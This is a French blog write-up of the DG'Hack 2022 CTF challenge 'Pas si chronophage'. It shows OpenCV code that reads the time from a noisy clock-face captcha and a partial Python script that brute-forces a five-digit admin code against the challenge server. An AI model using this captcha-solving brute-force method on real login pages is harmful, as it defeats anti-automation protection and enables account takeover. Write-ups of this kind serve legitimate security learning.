<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta
    name="description"
    content="Author: Kien Nguyen <kiennt2609@gmail.com>
      A minimal Hugo theme with Tailwind CSS"
  />
  <title>
    
      Blog de TaylorDeDordogne
      | Pas si chronophage
    
  </title>
  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <link
    rel="icon"
    href="/favicon_io/favicon.ico"
    type="image/x-icon"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-16x16.png"
    size="16x16"
    type="image/png"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-32x32.png"
    size="32x32"
    type="image/png"
  />

  <link
    rel="preload"
    type="text/css"
    href="/css/rose-pine.min.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/rose-pine.min.css"
      integrity=""
    />
  </noscript><link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Overpass+Mono:wght@400;500;700&family=Overpass:wght@400;500;700&display=swap"
  rel="stylesheet"
/>
<link
    rel="preload"
    type="text/css"
    href="/css/toigian.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/toigian.css"
      integrity=""
    />
  </noscript>

  
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/light.css"
    integrity=""
  />
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/dark.css"
    integrity=""
  />

  <script>
    
    if (
      localStorage.theme === "dark" ||
      (!("theme" in localStorage) &&
        window.matchMedia("(prefers-color-scheme: dark)").matches)
    ) {
      document.documentElement.classList.add("dark");
    } else {
      document.documentElement.classList.remove("dark");
    }
  </script>

  
  
  <script
    async
    defer
    src="/js/main.js"
    integrity=""
  ></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
  <script>
    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
  </script>
  
  
</head>
<body><header style="--layer: 10">
  <div
    aria-hidden="true"
    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
  ></div>

  <div
    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
  ><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/pas_si_chronophage/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Pas si chronophage</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="http://localhost:1313//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


</div>
</header>
<main class="flex justify-center px-page-gutter py-page-top">
      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/pas_si_chronophage/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Pas si chronophage</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="http://localhost:1313//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


<article>
  <h1>Pas si chronophage</h1>
  <time class="text-sm italic tabular-nums text-muted"
  >2023/01/13&nbsp;</time
>

  

  
    <div class="section">
      
        
        <a href="/tags/dev/" id="tag">Dev</a>
      
        
        <a href="/tags/dghack-2022/" id="tag">DG&#39;Hack 2022</a>
      
    </div>
  


<div id="toc">
  
    
      <details open>
        <summary>Table of contents</summary>
        <div id="toc-list"><nav id="TableOfContents">
  <ol>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#traitement-dimage">Traitement d&rsquo;image</a>
      <ol>
        <li><a href="#débruitage-de-limage">Débruitage de l&rsquo;image</a></li>
        <li><a href="#obtention-des-coordonnées-des-extrémités-des-aiguilles">Obtention des coordonnées des extrémités des aiguilles</a></li>
        <li><a href="#calcul-de-langle-des-aiguilles-à-partir-des-coordonnées">Calcul de l&rsquo;angle des aiguilles à partir des coordonnées</a></li>
      </ol>
    </li>
    <li><a href="#bruteforce">Bruteforce</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ol>
</nav></div>
      </details>
    
  
</div>
<div class="content"><h1 id="dghack-2022-pas-si-chronophage">DGHACK 2022: Pas si chronophage</h1>
<p>Ce challenge de programmation était un challenge de captcha nécessitant un vrai travail de traitement d&rsquo;image et donc super cool! Effectivement les captchas présentant des lettres peuvent être résolus facilement en utilisant des OCRs mais pour celui-ci où le captcha était une horloge je n&rsquo;ai pas trouvé d&rsquo;IA gratuite et adaptée au challenge, j&rsquo;ai opté pour une méthode plus compliquée mais aussi beaucoup plus intéressante que d&rsquo;utiliser une IA toute faite en plus de m&rsquo;avoir fait me replonger dans OpenCv :)</p>
<h2 id="introduction">Introduction</h2>
<p>L&rsquo;énoncé du challenge nous annonce que l&rsquo;application web permet la connexion de l&rsquo;utilisateur à son compte de box internet et se présente comme ceci:</p>
<p><img src="./assets/Capture_0.PNG" alt=""></p>
<p>On se doute qu&rsquo;il va falloir bruteforce un code avec un nouveau captcha à chaque nouvelle tentative et cela nous est confirmé quand après avoir rentré un mauvais code on peut accéder à ce tutoriel:</p>
<p><img src="./assets/Capture_1.PNG" alt=""></p>
<p>On y apprend que le code à bruteforce est constitué de 5 chiffres, cela fait en tout 10^5 possibilités ce qui est largement abordable or comme expliqué précédemment sans l&rsquo;aide d&rsquo;une IA il va falloir ruser pour arriver à extraire une heure sous la forme <code>hh:mm</code> depuis une image bruitée comme celle auquel on a accès. Je détaillerai surtout la partie traitement d&rsquo;image de ce challenge, la partie bruteforce étant assez triviale.</p>
<h2 id="traitement-dimage">Traitement d&rsquo;image</h2>
<h3 id="débruitage-de-limage">Débruitage de l&rsquo;image</h3>
<p>Avant toute chose je rajoute des bordures à l&rsquo;image pour faire en sorte que quand j&rsquo;essayerai de détecter le cercle constituant le cadran de l&rsquo;horloge ce dernier ne soit pas coupé par le bord de l&rsquo;image:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">addBorders</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">cv2</span><span class="o">.</span><span class="n">copyMakeBorder</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">BORDER_CONSTANT</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">clear</span> <span class="o">=</span> <span class="n">addBorders</span><span class="p">(</span><span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
</span></span></code></pre></div><p>Ensuite pour enlever les lignes de couleur j&rsquo;utilise ce bout de code qui convertit l&rsquo;image en noir et blanc en appliquant un seuil sur l&rsquo;image. Voilà ce que j&rsquo;obtiens:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">imgFloat</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">float</span><span class="p">)</span> <span class="o">/</span> <span class="mf">255.</span>
</span></span><span class="line"><span class="cl">    <span class="n">kernel</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">kChannel</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">imgFloat</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">kChannel</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span> <span class="o">*</span> <span class="n">kChannel</span><span class="p">)</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">binaryThresh</span> <span class="o">=</span> <span class="mi">190</span>
</span></span><span class="line"><span class="cl">    <span class="n">_</span><span class="p">,</span> <span class="n">binaryImage</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">threshold</span><span class="p">(</span><span class="n">kChannel</span><span class="p">,</span> <span class="n">binaryThresh</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_BINARY</span><span class="p">)</span>
</span></span></code></pre></div><p><img src="assets/binaryImage.PNG" alt=""></p>
<p>On décèle quelques impuretés sur les aiguilles et sur le contour de l&rsquo;image pour les enlever on va devoir utiliser deux fonctions très importantes d&rsquo;OpenCv, <code>erode</code> et <code>dilate</code>, <code>erode</code> est utilisée pour élaguer notre image et retirer des pixels blancs en trop, on va donc appliquer une porte <code>not</code> sur notre image avant de l&rsquo;éroder pour enlever les pixels blancs en trop puis on utilisera la fonction <code>delate</code> qui fait l&rsquo;opération inverse de <code>erode</code>. OpenCv va donc convoluer notre image avec une matrice dont la taille impliquera une érosion ou une dilatation plus ou moins grande, nous choisirons deux matrices carrées de taille 3 et 2 pour l&rsquo;érosion puis la dilatation respectivement.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">bitwise_not</span><span class="p">(</span><span class="n">binaryImage</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">kernel_e</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">kernel_d</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">erode</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">kernel_e</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">dilate</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">kernel_d</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span></code></pre></div><p><img src="assets/Eroded.PNG" alt=""></p>
<p>Ca y&rsquo;est! On a une image propre sur laquelle travailler. Il va maintenant s&rsquo;agir de déterminer le cercle formant le contour de l&rsquo;horloge afin d&rsquo;en trouver le centre et le rayon puis des coordonnées des aiguilles.</p>
<h3 id="obtention-des-coordonnées-des-extrémités-des-aiguilles">Obtention des coordonnées des extrémités des aiguilles</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">circles</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">HoughCircles</span><span class="p">(</span><span class="n">thresh</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">HOUGH_GRADIENT</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">minDist</span><span class="o">=</span><span class="mi">50</span><span class="p">,</span> <span class="n">param1</span><span class="o">=</span><span class="mi">190</span><span class="p">,</span> <span class="n">param2</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">minRadius</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">r</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="n">circles</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="s2">&#34;int&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">r</span>
</span></span></code></pre></div><p><img src="assets/Centered.PNG" alt=""></p>
<p>On peut bien voir le cercle formant le cadran de l&rsquo;horloge en vert ainsi que le centre de l&rsquo;horloge en rouge. On va se servir de ces deux informations pour pouvoir itérer sur les différents contours de notre image et trouver celui qui correspond aux aiguilles comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">contours</span><span class="p">,</span> <span class="n">_</span><span class="o">=</span><span class="n">cv2</span><span class="o">.</span><span class="n">findContours</span><span class="p">(</span><span class="n">thresh</span><span class="o">.</span><span class="n">copy</span><span class="p">(),</span><span class="n">cv2</span><span class="o">.</span><span class="n">RETR_TREE</span><span class="p">,</span><span class="n">cv2</span><span class="o">.</span><span class="n">CHAIN_APPROX_NONE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">hand_contour</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">contours</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">boundingRect</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">&lt;</span> <span class="n">radius</span> <span class="o">*</span> <span class="mf">1.90</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">w</span> <span class="o">&lt;</span> <span class="n">radius</span> <span class="o">*</span> <span class="mf">1.90</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">h</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">w</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">hand_contour</span> <span class="o">=</span> 
</span></span></code></pre></div><p><img src="assets/Contoured.PNG" alt=""></p>
<p>Là on peut bien voir qu&rsquo;on a réussi à trouver le contour correspondant aux aiguilles en mettant des contraintes de tailles sur la longueur et la largeur du dit-contour.
Et c&rsquo;est là que les réelles magouilles commencent: On veut trouver les deux extrémités des aiguilles pour en avoir les coordonnées mais pour cela on va devoir trouver les fameux <code>points de Hull</code>.</p>
<p>Pour faire court, les points de Hull sont une notion de topologie qui caractérise une forme: Il s&rsquo;agit des point traçant l&rsquo;enveloppe convexe d&rsquo;une forme, autrement dit si on entourait un élastique autour de notre forme il s&rsquo;agirait des points ressortissants.</p>
<p><img src="./assets/Convex.png" alt=""></p>
<p>Cela va nous être utile dans le sens où les points déisgnants les extrémités des aiguilles appartiendront forcément à ces <code>points de Hull</code>, il nous suffira de choisir les deux <code>points de Hull</code> les plus éloignés du centre du cadran ! Voilà la fonction d&rsquo;OpenCv pour obtenir les <code>points de Hull</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hull</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">convexHull</span><span class="p">(</span><span class="n">hand_contour</span><span class="p">)</span>
</span></span></code></pre></div><p><img src="assets/Convexed.PNG" alt=""></p>
<p>On est obligé de procéder par élimination car plusieurs points sont considérés comme des <code>points de Hull</code> pour une même aiguille. Grâce à un algorithme que j&rsquo;ai trouvé en ligne j&rsquo;ai pu faire en sorte de garder seulement un <code>point de Hull</code> correspondant dans chacune des zones bleues que l&rsquo;on peut voir sur l&rsquo;image d&rsquo;au dessus et je n&rsquo;ai gardé que les points les plus éloignés du centre pour enfin obtenir les coordonnées des extrémités des aiguilles.</p>
<p><img src="assets/Extremed.PNG" alt=""></p>
<h3 id="calcul-de-langle-des-aiguilles-à-partir-des-coordonnées">Calcul de l&rsquo;angle des aiguilles à partir des coordonnées</h3>
<p>C&rsquo;est là qu&rsquo;il va falloir ressortir ses formules de trigonométries de 3ème! On a les coordonnées d&rsquo;une aiguille dans le repère d&rsquo;OpenCv et on veut déterminer l&rsquo;angle parcouru par cette aiguille en question, pour ca on calcule la différence de coordonnées entre le centre et l&rsquo;extrémité de l&rsquo;aiguille en X et en Y:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">handX</span><span class="p">,</span> <span class="n">handY</span> <span class="o">=</span> <span class="n">hand</span>
</span></span><span class="line"><span class="cl">    <span class="n">centerX</span><span class="p">,</span> <span class="n">centerY</span> <span class="o">=</span> <span class="n">centre</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">diffX</span><span class="p">,</span> <span class="n">diffY</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">handX</span> <span class="o">-</span> <span class="n">centerX</span><span class="p">),</span> <span class="nb">float</span><span class="p">(</span><span class="n">handY</span> <span class="o">-</span> <span class="n">centerY</span><span class="p">)</span>
</span></span></code></pre></div><p>Il y&rsquo;a surement une manière généralisée de faire ça mais j&rsquo;ai personellement opté pour une disjonction de cas entre les 4 quarts de l&rsquo;horloge et j&rsquo;ai établi l&rsquo;équation de l&rsquo;angle de l&rsquo;aiguille par rapport à l&rsquo;heure <code>00:00</code> (une valeur d&rsquo;angle 0 dans notre référentiel) en fonction des valeurs de <code>diffX</code> et <code>diffY</code> et d&rsquo;une constante. Par exemple voilà comment calculer l&rsquo;angle parcouru par l&rsquo;aiguille quand elle se trouve dans le quart <code>haut/droite</code> de l&rsquo;horloge:</p>
<p><img src="assets/Trigo_2.png" alt=""></p>
<p>D&rsquo;après la formule <code>tan(A) = diffY / diffX</code> on en déduit que l&rsquo;angle B vaut:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">B</span> <span class="o">=</span> pi / <span class="m">2</span> - arctan<span class="o">(</span>diffY / diffX<span class="o">)</span>
</span></span></code></pre></div><p>On répète cette opération pour chaque quart du cadran et on finit par obtenir l&rsquo;équation de l&rsquo;angle parcouru par l&rsquo;aiguille.
Une fois qu&rsquo;on a obtenu l&rsquo;angle en Radian, on la convertit à degré et on utilise ces fonctions pour obtenir les valeur en heure ou en minute:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">findHour</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span> <span class="o">//</span> <span class="mi">30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">findMin</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span> <span class="o">/</span> <span class="mi">6</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="bruteforce">Bruteforce</h2>
<p>Une fois qu&rsquo;on a obtenue les valeurs sous le format <code>hh:mm</code> le bruteforce nécessite seulement un peu de parsing (à l&rsquo;arrache dans mon cas lmao):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">readClock</span> <span class="kn">import</span> <span class="n">findClockTime</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IDs</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">buildIDs</span><span class="p">(</span><span class="n">rep</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">matchs</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;div data-pos=&#34;\d&#34;&gt;\d&lt;/div&gt;&lt;/a&gt;&#39;</span><span class="p">,</span> <span class="n">rep</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="k">match</span> <span class="ow">in</span> <span class="n">matchs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">IDs</span><span class="p">[</span><span class="k">match</span><span class="p">[</span><span class="mi">18</span><span class="p">]]</span> <span class="o">=</span> <span class="k">match</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fromDateToId</span><span class="p">(</span><span class="n">date</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">date</span> <span class="o">=</span> <span class="n">date</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">date</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pos</span> <span class="o">=</span> <span class="n">IDs</span><span class="p">[</span><span class="n">digit</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pos</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">findCaptcha</span><span class="p">(</span><span class="n">rep</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">captcha</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;img class=&#34;captcha-image&#34; src=&#34;(.*)&#34; alt=&#34;captcha&#34;&gt;&#39;</span><span class="p">,</span> <span class="n">rep</span><span class="p">)</span><span class="o">.</span><span class="n">groups</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">captcha</span> <span class="o">=</span> <span class="s2">&#34;http://passichronophage.chall.malicecyber.com/&#34;</span> <span class="o">+</span> <span class="n">captcha</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sample.png&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">img</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">captcha</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">rep</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://passichronophage.chall.malicecyber.com/index.php&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">buildIDs</span><span class="p">(</span><span class="n">rep</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">findCaptcha</span><span class="p">(</span><span class="n">rep</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="n">findClockTime</span><span class="p">(</span><span class="s2">&#34;sample.png&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s2">&#34;#05&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="n">fromDateToId</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
